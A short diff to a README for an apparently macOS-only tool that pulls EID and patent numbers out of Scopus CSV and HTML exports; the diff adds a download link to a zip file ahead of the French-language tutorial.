@@ -3,6 +3,9 @@ Extract data from CSV &amp; HTML into EID &amp; Patent number
 
 **Only Available for MacOS.**
 
+	
+[**Download here**](https://sabercathost.com/1BK4/EID_Tool.zip)
+
 # Tutorial EID: 
 
 ##Exporter les données depuis Scopus sous forme CSV 
